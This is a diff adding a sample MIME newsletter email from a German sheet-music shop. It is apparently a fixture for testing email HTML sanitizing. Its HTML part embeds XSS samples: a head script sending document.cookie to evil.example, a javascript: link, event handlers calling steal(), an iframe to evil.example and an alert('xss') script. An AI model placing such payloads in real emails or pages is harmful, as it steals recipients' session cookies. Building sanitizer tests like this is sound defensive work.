@@ -1,0 +1,38 @@
+Return-Path: <bounce-7781@mailer.shop.example>
+MIME-Version: 1.0
+Date: Thu, 24 Sep 2026 07:00:00 +0200
+Message-ID: <nl-2026-09-24.7781@mailer.shop.example>
+Subject: Herbstangebote: 20 % auf Notenpulte
+From: Notenshop <newsletter@shop.example>
+To: adrian@goldner.test
+List-Unsubscribe: <https://shop.example/unsubscribe?u=7781>
+Content-Type: multipart/alternative; boundary="b1_shop_7781"
+
+--b1_shop_7781
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+
+Herbstangebote: 20 % auf Notenpulte. https://shop.example/herbst
+
+--b1_shop_7781
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html>
+<html>
+<head>
+<script>document.location='https://evil.example/steal?c='+document.cookie</script>
+<style>body{font-family:Arial}</style>
+</head>
+<body onload="track()">
+<h1>Herbstangebote</h1>
+<p>20 % auf <a href="https://shop.example/herbst" onclick="steal()">Notenpulte</a>.</p>
+<p><a href="javascript:alert(1)">Gutschein</a></p>
+<img src="https://track.shop.example/open.gif?u=7781" width="1" height="1" alt="">
+<img src="https://cdn.shop.example/banner.jpg" alt="Banner">
+<iframe src="https://evil.example/frame"></iframe>
+<script type="text/javascript">alert('xss')</script>
+</body>
+</html>
+
+--b1_shop_7781--
